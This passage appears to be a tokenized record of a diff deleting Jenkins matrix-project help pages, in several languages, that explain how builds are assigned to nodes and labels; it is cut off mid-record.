"zu", "\"", "Achsen", "\"", "finden", "Sie", "weitere", "Informationen", ",", "wie", "Sie", "auf", "die", "Werte", "der", "Achsenvariablen", "zugreifen", "k", "\u00f6", "nnen", ".", "<", "/", "div", ">", "@", "@", "-", "1", ",", "34", "+", "0", ",", "0", "@", "@", "\ufeff", "<", "div", ">", "Sp", "\u00e9", "cifiez", "ici", "les", "machines", "(", "noeuds", ")", "sur", "lesquelles", "les", "builds", "sont", "ex", "\u00e9", "cut", "\u00e9", "s", ".", "<", "ul", ">", "<", "li", ">", "Si", "aucune", "n", "'", "est", "s", "\u00e9", "lectionn", "\u00e9", "e", ",", "Jenkins", "choisira", "une", "des", "machines", "disponibles", "pour", "l", "'", "ex", "\u00e9", "cution", "du", "build", "(", "ce", "comportement", "est", "le", "m", "\u00ea", "me", "pour", "les", "projets", "free", "-", "style", "quand", "l", "'", "option", "\"", "attacher", "ce", "projet", "au", "noeud", "\"", "n", "'", "est", "pas", "s", "\u00e9", "lectionn", "\u00e9", "e", ")", ".", "C", "'", "est", "utile", "quand", "le", "projet", "n", "'", "a", "pas", "de", "d", "\u00e9", "pendance", "avec", "une", "machine", "particuli", "\u00e8", "re", ";", "Jenkins", "peut", "en", "effet", "ainsi", "utiliser", "les", "noeuds", "de", "fa", "\u00e7", "on", "optimale", ".", "<", "li", ">", "Si", "une", "machine", "est", "s", "\u00e9", "lectionn", "\u00e9", "e", ",", "Jenkins", "lancera", "toujours", "le", "build", "dessus", "(", "si", "vous", "en", "s", "\u00e9", "lectionnez", "une", "parmi", "les", "\"", "noeuds", "sp", "\u00e9", "cifiques", "\"", ")", "ou", "sur", "une", "des", "machines", "qui", "appartiennent", "\u00e0", "un", "libell", "\u00e9", "(", "si", "vous", "en", "choisissez", "une", "dans", "\"", "libell", "\u00e9", "\")", ".", "C", "'", "est", "pratique", "quand", "le", "build", "doit", "tourner", "sur", "un", "ordinateur", "particulier", "ou", "sur", "un", "sous", "-", "ensemble", "d", "'", "ordinateurs", ".", "Par", "exemple", ",", "si", "votre", "build", "n", "\u00e9", "cessite", "MacOS", "X", ".", "<", "li", ">", "Si", "de", "multiples", "valeurs", "sont", "s", "\u00e9", "lectionn", "\u00e9", "es", ",", "la", "matrice", "de", "configuration", "sera", "\u00e9", "tendue", "de", "fa", "\u00e7", "on", "\u00e0", "les", "inclure", "toutes", "et", "les", "builds", "seront", "ex", "\u00e9", "cut", "\u00e9", "s", "sur", "tous", "les", "noeuds", "ou", "libell", "\u00e9", "s", ".", "Cela", "est", "utile", ",", "par", "exemple", ",", "quand", "vous", "souhaitez", "lancer", "des", "tests", "sur", "Windows", ",", "Linux", "et", "Solaris", ".", "<", "/", "ul", ">", "<", "br", ">", "Au", "cours", "d", "'", "un", "build", ",", "le", "nom", "du", "noeud", "ou", "du", "libell", "\u00e9", "s", "\u00e9", "lectionn", "\u00e9", "pour", "un", "lancement", "donn", "\u00e9", "est", "visible", "sous", "l", "'", "axe", "\"", "libell", "\u00e9", "\".", "R", "\u00e9", "f", "\u00e9", "rez", "-", "vous", "\u00e0", "l", "'", "aide", "sur", "les", "\"", "axes", "\"", "ci", "-", "dessous", "pour", "plus", "d", "'", "informations", "sur", "l", "'", "acc", "\u00e8", "s", "\u00e0", "la", "valeur", "de", "l", "'", "axe", ".", "<", "/", "div", ">", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "<", "div", ">", "\u30d3", "\u30eb\u30c9", "\u3092\u5b9f", "\u884c\u3059", "\u308b\u30ce", "\u30fc\u30c9", "\u3092\u9078", "\u629e\u3057", "\u307e\u3059", "\u3002", "<", "ul", ">", "<", "li", ">", "\u30ce", "\u30fc\u30c9", "\u3092\u9078", "\u629e\u3059", "\u308b\u3068", "\u3001", "Jenkins", "\u306f", "\u30d3\u30eb", "\u30c9\u3092", "\u5b9f\u884c", "\u53ef\u80fd", "\u306a\u30ce", "\u30fc\u30c9", "\u3092\u9078", "\u629e\u3057", "\u307e\u3059", "(\u3053", "\u306e\u52d5", "\u4f5c\u306f", "\u3001", "\"", "\u3053\u306e", "\u30d3\u30eb", "\u30c9\u306f", "\u6307\u5b9a", "\u306e\u30ce", "\u30fc\u30c9", "\u4e0a\u3067", "\u306e\u307f", "\u5b9f\u884c", "\"\u3092", "\u9078\u629e", "\u3057\u3066", "\u3044\u306a", "\u3044\u5834", "\u5408\u306e", "\u30d5\u30ea", "\u30fc\u30b9", "\u30bf\u30a4", "\u30eb\u3068", "\u540c\u3058", "\u3067\u3059", ")\u3002", "\u30d7", "\u30ed\u30b8", "\u30a7\u30af", "\u30c8\u304c", "\u7279\u5b9a", "\u306e\u30ce", "\u30fc\u30c9", "\u306b\u4f9d", "\u5b58\u3057", "\u3066\u3044", "\u306a\u3044", "\u3068\u304d", "\u3001", "Jenkins", "\u306f", "\u30ce\u30fc", "\u30c9\u3092", "\u6700\u9069", "\u306a\u65b9", "\u6cd5\u3067", "\u5229\u7528", "\u3067\u304d", "\u308b\u306e", "\u3067\u3001", "\u4fbf", "\u5229\u3067", "\u3059\u3002", "<", "li", ">", "\uff11", "\u3064\u3060", "\u3051\u9078", "\u629e\u3059", "\u308b\u3068", "\u3001", "Jenkins", "\u306f", "\u30d3\u30eb", "\u30c9\u3092", "\u3001\u6307", "\u5b9a\u3055", "\u308c\u305f", "\u30ce\u30fc", "\u30c9(", "\"\u500b", "\u5225\u306e", "\u30ce\u30fc", "\u30c9\"", "\u304b\u3089", "1", "\u3064", "\u9078\u629e", ")\u304b", "\u3001", "\u30e9", "\u30d9\u30eb", "\u306b\u5c5e", "\u3059\u308b", "\u8907\u6570", "\u30ce\u30fc", "\u30c9\u306e", "\u3046\u3061", "\u306e", "1", "\u3064", "\u306e\u30ce", "\u30fc\u30c9", "(\"", "\u30e9\u30d9", "\u30eb\"", "\u304b\u3089", "1", "\u3064", "\u9078\u629e", ")\u3067", "\u5b9f\u884c", "\u3057\u307e", "\u3059\u3002", "\u3053", "\u308c\u306f", "\u3001\u30d3", "\u30eb\u30c9", "\u3092\u7279", "\u5b9a\u306e", "\u30b3\u30f3", "\u30d4\u30e5", "\u30fc\u30bf", "\u30fc\u3084", "\u30b3\u30f3", "\u30d4\u30e5", "\u30fc\u30bf", "\u30fc\u306e", "\u30bb\u30c3", "\u30c8\u3067", "\u52d5\u304b", "\u3059\u5fc5", "\u8981\u304c", "\u3042\u308b", "\u5834\u5408", "\u306b\u4fbf", "\u5229\u3067", "\u3059\u3002", "\u4f8b", "\u3048\u3070", "\u3001\u30d3", "\u30eb\u30c9", "\u306b", "MacOS", "X", "\u304c", "\u5fc5\u8981", "\u306a\u5834", "\u5408\u306a", "\u3069\u3002", "<", "li", ">", "\u8907", "\u6570\u306e", "\u5024\u3092", "\u9078\u629e", "\u3059\u308b", "\u3068\u3001", "\u69cb\u6210", "\u30de\u30c8", "\u30ea\u30c3", "\u30af\u30b9", "\u306f\u305d", "\u308c\u3089", "\u3092\u542b", "\u3080\u3088", "\u3046\u306b", "\u62e1\u5f35", "\u3055\u308c", "\u3001", "\u30d3", "\u30eb\u30c9", "\u306f\u9078", "\u629e\u3057", "\u305f\u30ce", "\u30fc\u30c9", "\u3082\u3057", "\u304f\u306f", "\u30e9\u30d9", "\u30eb\u3067", "\u5b9f\u884c", "\u3055\u308c", "\u307e\u3059", "\u3002\u4f8b", "\u3048\u3070", "\u3001", "Windows", "\u3001", "Linux", "\u304a", "\u3088\u3073", "Solaris", "\u3067", "\u30c6\u30b9", "\u30c8\u3092", "\u3057\u305f", "\u3044\u5834", "\u5408\u306b", "\u4fbf\u5229", "\u3067\u3059", "\u3002", "<", "/", "ul", ">", "<", "br", ">", "\u9078", "\u629e\u3057", "\u305f\u30ce", "\u30fc\u30c9", "\u540d\u3084", "\u30e9\u30d9", "\u30eb\u540d", "\u306f\u3001", "\u30d3\u30eb", "\u30c9\u5b9f", "\u884c\u4e2d", "\u306b\u306f", "\u3001\"", "label", "\"", "\u3068\u3044", "\u3046\u8ef8", "\u3068\u3057", "\u3066\u5229", "\u7528\u53ef", "\u80fd\u3067", "\u3059\u3002", "\u8ef8", "\u306e\u5024", "\u306e\u30a2", "\u30af\u30bb", "\u30b9\u65b9", "\u6cd5\u306e", "\u8a73\u7d30", "\u306b\u3064", "\u3044\u3066", "\u306f\u3001", "\"\u69cb", "\u6210\u8ef8", "\"\u306e", "\u30d8\u30eb", "\u30d7\u3092", "\u53c2\u7167", "\u3057\u3066", "\u304f\u3060", "\u3055\u3044", "\u3002", "<", "/", "div", ">", "@", "@", "-", "1", ",", "15", "+", "0", ",", "0", "@", "@", "<", "div", ">", "Geef", "de", "nodes", ",", "waar", "uw", "bouwpoging", "uitgevoerd", "wordt", ",", "op", ".", "<", "ul", ">", "<", "li", ">", "Indien", "niet", "opgegeven", ",", "zal", "Jenkins", "een", "beschikbare", "node", "kiezen", "voor", "het", "uitvoeren", "van", "uw", "bouwpoging", ".", "(", "Dit", "is", "hetzelfde", "gedrag", "als", "voor", "een", "project", "vrije", "stijl", ",", "indien", "niet", "vast", "aan", "een", "welbepaalde", "node", "voor", "uitvoering", "toegewezen", ".", ")", "Dit", "is", "handig", "indien", "uw", "projecten", "geen", "specifieke", "afhankelijkheden", "naar", "een", "welbepaalde", "node", "hebben", ".", "Het", "stelt", "Jenkins", "in", "staat", "om", "zijn", "nodes", "op", "een", "optimale", "manier", "te", "benutten", ".", "<", "li", ">", "Indien", "U", "wel", "een", "node", "selecteert", ",", "zal", "Jenkins", "uw", "bouwpogingen", "altijd", "op", "de", "opgegeven", "node", "uitvoeren", ".", "Op", "eenzelfde", "manier", "zal", "Jenkins", "ervoor", "zorgen", "dat", "uw", "pogingen", "altijd", "op", "\ufffd", "\ufffd", "n", "node", "van", "een", "groep", "nodes", "zal", "uitgevoerd", "worden", ",", "indien", "u", "een", "groepslabel", "gekozen", "hebt", ".", "Dit", "is", "natuurlijk", "hoogst", "nuttig", "indien", "bepaalde", "van", "uw", "projecten", "op", "een", "welbepaalde", "node", "of", "soort", "node", "uitgevoerd", "dienen", "te", "worden", ".", "Bvb", ".", "indien", "sommige", "van", "uw", "projecten", "op", "windows", ",", "Mac", "Os", ",", "linux", ",", "..", "..", "uitgevoerd", "moeten", "worden", ".", "<", "li", ">", "Indien", "U", "meerdere", "waarden", "selecteert", ",", "wordt", "de", "configuratiematrix", "zo", "opgesteld", ",", "dat", "uw", "bouwpogingen", "op", "alle", "geselecteerde", "nodes", "en", "/", "of", "groepen", "uitgevoerd", "wordt", ".", "Dit", "is", "handig", "indien", "je", "projecten", "hebt", "die", "op", "meerdere", "platformen", "gebouwd", "moeten", "worden", ".", "Denk", "maar", "aan", "applicaties", "die", "ontwikkeld", "worden", "voor", "zowel", "Linux", ",", "Mac", "OS", ",", "Solaris", "als", "Windows", ".", "<", "/", "ul", ">", "<", "br", ">", "Tijdens", "een", "bouwpoging", ",", "is", "de", "naam", "van", "de", "node", "of", "nodegroep", ",", "waarop", "de", "bouwpoging", "plaatsvindt", ",", "beschikbaar", "onder", "de", "\"", "label", "\"", "dimensie", ".", "Zie", "de", "beschikbare", "hulppaginas", "over", "dimensies", "indien", "U", "meer", "te", "weten", "wenst", "te", "komen", "over", "de", "dimensies", "van", "een", "matrixproject", ".", "<", "/", "div", ">", "@", "@", "-", "1", ",", "27", "+", "0", ",", "0", "@", "@", "<", "div", ">", "Especifica", "os", "n", "&", "#", "243", ";", "s", "onde", "as", "constru", "&", "#", "231", ";", "&#", "245", ";", "es", "ser", "&", "#", "227", ";", "o", "executadas", ".", "<", "ul", ">", "<", "li", ">", "Se", "nenhum", "for", "selecionado", ",", "Jenkins", "escolher", "&", "#", "225", ";", "um", "n", "&", "#", "243", ";", "dispon", "&", "#", "237", ";", "vel", "para", "executar", "uma", "constru", "&", "#", "231", ";", "&#", "227", ";", "o", "(", "este", "&", "#", "233", ";", "o", "mesmo", "comportamento", "do", "projeto", "estilo", "-", "livre", "quando", "\"", "amarrar", "este", "projeto", "ao", "n", "&", "#", "243", ";", "\"", "n", "&", "#", "227", ";", "o", "estiver", "selecionado", ")", ".", "Isto", "&", "#", "233", ";", "&", "#", "250", ";", "til", "quando", "o", "projeto", "n", "&", "#", "227", ";", "o", "tem", "depend", "&", "#", "234", ";", "ncia", "em", "nenhum", "n", "&", "#", "243", ";", "particular", ",", "assim", "ele", "permite", "ao", "Jenkins", "utilizar", "n", "&", "#", "243", ";", "s", "em", "uma", "forma", "&", "#", "243", ";", "tima", ".", "<", "li", ">", "Se", "um", "for", "selecionado", ",", "Jenkins", "sempre", "executar", "&", "#", "225", ";", "a", "constru", "&", "#", "231", ";", "&#", "227", ";", "o", "no", "n", "&", "#", "243", ";", "especificado", "(", "se", "voc", "&", "#", "234", ";", "selecionar", "um", "de", "\"", "n", "&", "#", "243", ";", "s", "espec", "&", "#", "237", ";", "ficos", "\"", ")", "ou", "um", "dos", "n", "&", "#", "243", ";", "s", "que", "pertencem", "ao", "label", "(", "se", "voc", "&", "#", "234", ";", "selecionar", "um", "de", "\"", "label", "\"", ").", "Isto", "&", "#", "233", ";", "&", "#", "250", ";", "til", "quando", "for", "necess", "&", "#", "225", ";", "rio", "que", "a", "constru", "&", "#", "231", ";", "&#", "227", ";", "o", "execute", "em", "um", "computador", "espec", "&", "#", "237", ";", "fico", ",", "ou", "em", "um", "subconjunto", "de", "computadores", ".", "Por", "exemplo", ",", "talvez", "sua", "constru", "&", "#", "231", ";", "&#", "227", ";", "o", "necessite", "de", "um", "MacOS", "X", ".", "<", "li", ">", "Se", "valores", "m", "&", "#", "250", ";", "ltiplos", "forem", "selecionados", ",", "a", "matriz", "de", "configura", "&", "#", "231", ";", "&#", "227", ";", "o", "ser", "&", "#", "225", ";", "expandida", "para", "incluir", "todos", "eles", ",", "e", "as", "constru", "&", "#", "231", ";", "&#", "245", ";", "s", "ser", "&", "#", "227", ";", "o", "executadas", "em", "todos", "os", "n", "&", "#", "243", ";", "s", "/", "labels", "selecionandos", ".", "Isto", "&", "#", "233", ";", "&", "#", "250", ";", "lti", ",", "por", "exemplo", ",", "quando", "voc", "&", "#", "234", ";", "quiser", "executar", "testes", "em", "Windows", ",", "Linux", ",", "e", "Solaris", ".", "<", "/", "ul", ">", "<", "br", ">", "Durante", "uma", "constru", "&", "#", "231", ";", "&#", "227", ";", "o", ",", "o", "nome", "do", "n", "&", "#", "243", ";", "/", "label", "selecionado", "est", "&", "#", "225", ";", "dispon", "&", "#", "237", ";", "vel", "como", "o", "eixo", "\"", "label", "\"", ".", "Veja", "a", "ajuda", "de", "\"", "eixos", "\"", "abaixo", "para", "mais", "informa", "&", "#", "231", ";", "&#", "245", ";", "es", "sobre", "como", "acessar", "o", "valor", "do", "eixo", ".", "<", "/", "div", ">", "@", "@", "-", "1", ",", "28", "+", "0", ",", "0", "@", "@", "\ufeff", "<", "div", ">", "\u0412", "\u044b\u0431", "\u0435\u0440", "\u0438\u0442", "\u0435", "\u0443", "\u0437\u043b", "\u044b,", "\u043d", "\u0430", "\u043a", "\u043e\u0442", "\u043e\u0440", "\u044b\u0445", "\u0431", "\u0443\u0434", "\u0435\u0442", "\u043f", "\u0440\u043e", "\u0438\u0437", "\u0432\u043e", "\u0434\u0438", "\u0442\u044c", "\u0441\u044f", "\u0441", "\u0431\u043e", "\u0440\u043a", "\u0430.", "<", "ul", ">", "<", "li", ">", "\u0415", "\u0441\u043b", "\u0438", "\u043d", "\u0438\u0447", "\u0435\u0433", "\u043e", "\u043d", "\u0435", "\u0432", "\u044b\u0431", "\u0440\u0430", "\u043d\u043e", ",", "Jenkins", "\u0441", "\u0430\u043c", "\u0432", "\u044b\u0431", "\u0435\u0440", "\u0435\u0442", "\u0434", "\u043e\u0441", "\u0442\u0443", "\u043f\u043d", "\u044b\u0439", "\u0443", "\u0437\u0435", "\u043b", "\u0434", "\u043b\u044f", "\u0432", "\u044b\u043f", "\u043e\u043b", "\u043d\u0435", "\u043d\u0438", "\u044f", "\u0441", "\u0431\u043e", "\u0440\u043a", "\u0438", "(", "\u0442\u0430", "\u043a\u043e", "\u0435", "\u0436", "\u0435", "\u043f", "\u043e\u0432", "\u0435\u0434", "\u0435\u043d", "\u0438\u0435", "\u043a", "\u0430\u043a", "\u0438", "\u0432", "\u0441", "\u043b\u0443", "\u0447\u0430", "\u0435", "\u043f", "\u0440\u043e", "\u0435\u043a", "\u0442\u0430", "\u0432", "\u0441", "\u0432\u043e", "\u0431\u043e", "\u0434\u043d", "\u043e\u0439", "\u0444", "\u043e\u0440", "\u043c\u0435", "(", "free", "-", "style", ")", ",", "\u043a", "\u043e\u0433", "\u0434\u0430", "\u043e", "\u043f\u0446", "\u0438\u044f", "\"", "\u041f\u0440", "\u0438\u0432", "\u044f\u0437", "\u0430\u0442", "\u044c", "\u043f", "\u0440\u043e", "\u0435\u043a", "\u0442", "\u043a", "\u0443", "\u0437\u043b", "\u0443\"", "\u043d", "\u0435", "\u0432", "\u043a\u043b", "\u044e\u0447", "\u0435\u043d", "\u0430)", ".", "\u042d", "\u0442\u043e", "\u043f", "\u043e\u043b", "\u0435\u0437", "\u043d\u043e", "\u043a", "\u043e\u0433", "\u0434\u0430", "\u043f", "\u0440\u043e", "\u0435\u043a", "\u0442", "\u043d", "\u0435", "\u0438", "\u043c\u0435", "\u0435\u0442", "\u0437", "\u0430\u0432", "\u0438\u0441", "\u0438\u043c", "\u043e\u0441", "\u0442\u0438", "\u043e", "\u0442", "\u043a", "\u043e\u043d", "\u043a\u0440", "\u0435\u0442", "\u043d\u043e", "\u0433\u043e", "\u0443", "\u0437\u043b", "\u0430", "\u0438", "\u043f", "\u043e\u0437", "\u0432\u043e", "\u043b\u044f", "\u0435\u0442", "\u0441", "\u0438\u0441", "\u0442\u0435", "\u043c\u0435", "\u0438", "\u0441\u043f", "\u043e\u043b", "\u044c\u0437", "\u043e\u0432", "\u0430\u0442", "\u044c", "\u0443", "\u0437\u043b", "\u044b", "\u043e", "\u043f\u0442", "\u0438\u043c", "\u0430\u043b", "\u044c\u043d", "\u044b\u043c", "\u043e", "\u0431\u0440", "\u0430\u0437", "\u043e\u043c", ".", "<", "li", ">", "\u0415", "\u0441\u043b", "\u0438", "\u0432", "\u044b\u0431", "\u0440\u0430", "\u043d", "\u043e", "\u0434\u0438", "\u043d", "\u0443", "\u0437\u0435", "\u043b,", "\u0442", "\u043e", "Jenkins", "\u0432", "\u0441\u0435", "\u0433\u0434", "\u0430", "\u0431", "\u0443\u0434", "\u0435\u0442", "\u0432", "\u044b\u043f", "\u043e\u043b", "\u043d\u044f", "\u0442\u044c", "\u0441", "\u0431\u043e", "\u0440\u043a", "\u0443", "\u0442", "\u043e\u043b", "\u044c\u043a", "\u043e", "\u043d", "\u0430", "\u0443", "\u043a\u0430", "\u0437\u0430", "\u043d\u043d", "\u043e\u043c", "\u0443", "\u0437\u043b", "\u0435", "(", "\u0435\u0441", "\u043b\u0438", "\u0432", "\u044b", "\u0432", "\u044b\u0431", "\u0440\u0430", "\u043b\u0438", "\u043e", "\u0434\u0438", "\u043d", "\u0438", "\u0437", "\u043a", "\u043e\u043d", "\u043a\u0440", "\u0435\u0442", "\u043d\u044b", "\u0445", "\u0443", "\u0437\u043b", "\u043e\u0432", "),", "\u043b", "\u0438\u0431", "\u043e", "\u043e", "\u0434\u0438", "\u043d", "\u0438", "\u0437", "\u0443", "\u0437\u043b", "\u043e\u0432", "\u0441", "\u0443", "\u043a\u0430", "\u0437\u0430", "\u043d\u043d", "\u043e\u0439", "\u043c", "\u0435\u0442", "\u043a\u043e", "\u0439", "(", "\u0435\u0441", "\u043b\u0438", "\u0432", "\u044b", "\u0432", "\u044b\u0431", "\u0440\u0430", "\u043b\u0438", "\u043e", "\u0434\u043d", "\u0443", "\u0438", "\u0437", "\"", "\u041c\u0435", "\u0442\u043e", "\u043a\"", ").", "\u042d", "\u0442\u043e", "\u043c", "\u043e\u0436", "\u0435\u0442", "\u0431", "\u044b\u0442", "\u044c", "\u043f", "\u043e\u043b", "\u0435\u0437", "\u043d\u043e", "\u0432", "\u0441", "\u043b\u0443", "\u0447\u0430", "\u0435,", "\u0435", "\u0441\u043b", "\u0438", "\u0441", "\u0431\u043e", "\u0440\u043a", "\u0430", "\u0434", "\u043e\u043b", "\u0436\u043d", "\u0430", "\u0431", "\u044b\u0442", "\u044c", "\u0437", "\u0430\u043f", "\u0443\u0449", "\u0435\u043d", "\u0430", "\u043d", "\u0430", "\u043a", "\u043e\u043d", "\u043a\u0440", "\u0435\u0442", "\u043d\u043e", "\u043c", "\u0443", "\u0437\u043b", "\u0435", "\u0438", "\u043b\u0438", "\u043d", "\u0430\u0431", "\u043e\u0440", "\u0435", "\u0443", "\u0437\u043b", "\u043e\u0432", ".", "\u041d", "\u0430\u043f", "\u0440\u0438", "\u043c\u0435", "\u0440,", "\u0432", "\u043e\u0437", "\u043c\u043e", "\u0436\u043d", "\u043e,", "\u0432", "\u0430\u0448", "\u0430", "\u0441", "\u0431\u043e", "\u0440\u043a", "\u0430", "\u0442", "\u0440\u0435", "\u0431\u0443", "\u0435\u0442", "MacOS", "X", ".", "<", "li", ">", "\u0415", "\u0441\u043b", "\u0438", "\u0432", "\u044b\u0431", "\u0440\u0430", "\u043d\u043e", "\u043d", "\u0435\u0441", "\u043a\u043e", "\u043b\u044c", "\u043a\u043e", "\u0437", "\u043d\u0430", "\u0447\u0435", "\u043d\u0438", "\u0439,", "\u043a", "\u043e\u043d", "\u0444\u0438", "\u0433\u0443", "\u0440\u0430", "\u0446\u0438", "\u043e\u043d", "\u043d\u0430", "\u044f", "\u043c", "\u0430\u0442", "\u0440\u0438", "\u0446\u0430", "\u0431", "\u0443\u0434", "\u0435\u0442", "\u0440", "\u0430\u0441", "\u0448\u0438", "\u0440\u0435", "\u043d\u0430", "\u0434", "\u043b\u044f", "\u0432", "\u043a\u043b", "\u044e\u0447", "\u0435\u043d", "\u0438\u044f", "\u0438", "\u0445", "\u0432", "\u0441\u0435", "\u0445", "\u0438", "\u0441", "\u0431\u043e", "\u0440\u043a", "\u0438", "\u0431", "\u0443\u0434", "\u0443\u0442", "\u043f", "\u0440\u043e", "\u0438\u0437", "\u0432\u043e", "\u0434\u0438", "\u0442\u044c", "\u0441\u044f", "\u043d", "\u0430", "\u0432", "\u0441\u0435", "\u0445", "\u0432", "\u044b\u0431", "\u0440\u0430", "\u043d\u043d", "\u044b\u0445", "\u0443", "\u0437\u043b", "\u0430\u0445", "/\u043c", "\u0435\u0442", "\u043a\u0430", "\u0445.", "\u042d", "\u0442\u043e", "\u043c", "\u043e\u0436", "\u0435\u0442", "\u0431", "\u044b\u0442", "\u044c", "\u0443", "\u0434\u043e", "\u0431\u043d", "\u043e,", "\u0435", "\u0441\u043b", "\u0438", "\u0432", "\u0430\u0448", "\u043f", "\u0440\u043e", "\u0435\u043a", "\u0442", "\u0441", "\u043e\u0431", "\u0438\u0440", "\u0430\u0435", "\u0442\u0441", "\u044f", "\u043b", "\u0438\u0431", "\u043e", "\u0442", "\u0435\u0441", "\u0442\u0438", "\u0440\u0443", "\u0435\u0442", "\u0441\u044f", "\u043d", "\u0430", "Windows", ",", "Linux", "\u0438", "Solaris", ".", "<", "/", "ul", ">", "<", "br", ">", "\u0412", "\u043f", "\u0440\u043e", "\u0446\u0435", "\u0441\u0441", "\u0435", "\u0441", "\u0431\u043e", "\u0440\u043a", "\u0438", "\u0432", "\u044b\u0431", "\u0440\u0430", "\u043d\u043d", "\u043e\u0435", "\u0438", "\u043c\u044f", "\u0443", "\u0437\u043b", "\u0430/", "\u043c\u0435", "\u0442\u043a", "\u0438", "\u0434", "\u043e\u0441", "\u0442\u0443", "\u043f\u043d", "\u043e", "\u043a", "\u0430\u043a", "\u043e", "\u0441\u044c", "\"", "labels", "\"", ".", "\u0421", "\u043c\u043e", "\u0442\u0440", "\u0438\u0442", "\u0435", "\u0432", "\u043f", "\u043e\u0434", "\u0441\u043a", "\u0430\u0437", "\u043a\u0443", "\u043a", "\u043e", "\u043f\u0446", "\u0438\u0438", "\"", "\u041e\u0441", "\u0438", "(", "axes", ")", "\"", "\u043d", "\u0438\u0436", "\u0435", "\u0434", "\u043b\u044f", "\u043f", "\u043e\u043b", "\u0443\u0447", "\u0435\u043d", "\u0438\u044f", "\u0431", "\u043e\u043b", "\u0435\u0435", "\u043f", "\u043e\u0434", "\u0440\u043e", "\u0431\u043d", "\u043e\u0439", "\u0438", "\u043d\u0444", "\u043e\u0440", "\u043c\u0430", "\u0446\u0438", "\u0438", "\u043e", "\u0442", "\u043e\u043c", "\u043a", "\u0430\u043a", "\u043f", "\u043e\u043b", "\u0443\u0447", "\u0438\u0442", "\u044c", "\u0437", "\u043d\u0430", "\u0447\u0435", "\u043d\u0438", "\u044f", "\u043f", "\u043e", "\u043e", "\u0441\u044f", "\u043c.", "<", "/", "div", ">", "@", "@", "-", "1", ",", "26", "+", "0", ",", "0", "@", "@", "<", "div", ">", "Yap", "&", "#", "305", ";", "land", "&", "#", "305", ";", "rmalar", "&", "#", "305", ";", "n", "&", "#", "231", ";", "al", "&", "#", "305", ";", "&#", "351", ";", "t", "&", "#", "305", ";", "r", "&", "#", "305", ";", "laca", "&", "#", "287", ";", "&#", "305", ";", "nodlar", "&", "#", "305", ";", "belirleyiniz", ".", "<", "ul", ">", "<", "li", ">", "Herhangi", "bir", "se", "&", "#", "231", ";", "im", "yap", "&", "#", "305", ";", "lmaz", "ise", ",", "Jenkins", "yap", "&", "#", "305", ";", "land", "&", "#", "305", ";", "rma", "i", "&", "#", "231", ";", "in", "uygun", "bir", "nod", "se", "&", "#", "231", ";", "ecektir", "(", "Ayn", "&", "#", "305", ";", "serbest", "-", "stil", "projede", "\"", "bu", "projeyi", "bir", "noda", "ba", "&", "#", "287", ";", "la", "\"", "se", "&", "#", "231", ";", "ene", "&", "#", "287", ";", "inin", "se", "&", "#", "231", ";", "ilmedi", "&", "#", "287", ";", "i", "durumdaki", "gibi", ")", "E", "&", "#", "287", ";", "er", "projenizin", "herhangi", "bir", "noda", "ba", "&", "#", "287", ";", "&#", "305", ";", "ml", "&", "#", "305", ";", "l", "&", "#", "305", ";", "&#", "287", ";", "&#", "305", ";", "yoksa", "Jenkins", "nodlar", "&", "#", "305", ";", "uygun", "bi", "&", "#", "231", ";", "imde", "de", "&", "#", "287", ";", "erlendirerek", "size", "en", "uygun", "durumu", "sa", "&", "#", "287", ";", "layacakt", "&", "#", "305", ";", "r", ".", "<", "li", ">", "E", "&", "#", "287", ";", "er", "bir", "tane", "se", "&", "#", "231", ";", "ilirse", ",", "Jenkins", "yap", "&", "#", "305", ";", "land", "&", "#", "305", ";", "rmay", "&", "#", "305", ";", "daima", "se", "&", "#", "231", ";", "ilen", "nodda", "(", "\"", "belirli", "nodlar", "\"", "dan", "birisi", "se", "&", "#", "231", ";", "ilirse", ")", "veya", "etikete", "dahil", "olan", "nodlardan", "bir", "tanesinde", "(", "e", "&", "#", "287", ";", "er", "\"", "etiket", "\"", "ten", "bir", "tane", "se", "&", "#", "231", ";", "ilirse", ")", "&", "#", "231", ";", "al", "&", "#", "305", ";", "&#", "351", ";", "t", "&", "#", "305", ";", "racakt", "&", "#", "305", ";", "r", ".", "Bu", "se", "&", "#", "231", ";", "enek", ",", "yap", "&", "#", "305", ";", "land", "&", "#", "305", ";", "rma", "e", "&", "#", "287", ";", "er", "belli", "bir", "bilgisayar", "veya", "bilgisayarlar", "k", "&", "#", "252", ";", "mesinde", "&", "#", "231", ";", "al", "&", "#", "305", ";", "&#", "351", ";", "t", "&", "#", "305", ";", "r", "&", "#", "305", ";", "lacak", "ise", "faydal", "&", "#", "305", ";", "olacakt", "&", "#", "305", ";", "r", ".", "Mesela", ",", "yap", "&", "#", "305", ";", "land", "&", "#", "305", ";", "rman", "&", "#", "305", ";", "z", "&", "#", "305", ";", "n", "MacOS", "X", "&", "#", "252", ";", "zerinde", "&", "#", "231", ";", "al", "&", "#", "305", ";", "&#", "351", ";", "mas", "&", "#", "305", ";", "gerekebilir", ".", "<", "li", ">", "E", "&", "#", "287", ";", "er", "birden", "fazla", "de", "&", "#", "287", ";", "er", "se", "&", "#", "231", ";", "ilirse", ",", "konfig", "&", "#", "252", ";", "rasyon", "matrisi", "hepsini", "kapsayacak", "&", "#", "351", ";", "ekilde", "geni", "&", "#", "351", ";", "letilir", ",", "ve", "yap", "&", "#", "305", ";", "land", "&", "#", "305", ";", "rmalar", "se", "&", "#", "231", ";", "ilen", "t", "&", "#", "252", ";", "m", "nodlar", "/", "etiketler", "&", "#", "252", ";", "zerinde", "&", "#", "231", ";", "al", "&", "#", "305", ";", "&#", "351", ";", "t", "&", "#", "305", ";", "r", "&", "#", "305", ";", "l", "&", "#", "305", ";", "r", ".", "Bu", "se", "&", "#", "231", ";", "enek", ",", "mesela", "testlerinizi", "Windows", ",", "Linux", "ve", "Solaris", "&", "#", "252", ";", "zerinde", "&", "#", "231", ";", "al", "&", "#", "305", ";", "&#", "351", ";", "t", "&", "#", "305", ";", "rmak", "istedi", "&", "#", "287", ";", "inizde", "faydal", "&", "#", "305", ";", "olacakt", "&", "#", "305", ";", "r", ".", "<", "/", "ul", ">", "<", "br", ">", "Yap", "&", "#", "305", ";", "land", "&", "#", "305", ";", "rma", "esnas", "&", "#", "305", ";", "nda", ",", "se", "&", "#", "231", ";", "ilen", "nod", "ad", "&", "#", "305", ";", "/", "etiket", "ad", "&", "#", "305", ";", "\"", "etiket", "\"", "ekseninde", "g", "&", "#", "246", ";", "r", "&", "#", "252", ";", "nt", "&", "#", "252", ";", "lenecektir", ".", "Eksen", "de", "&", "#", "287", ";", "erlerine", "nas", "&", "#", "305", ";", "l", "eri", "&", "#", "351", ";", "ilece", 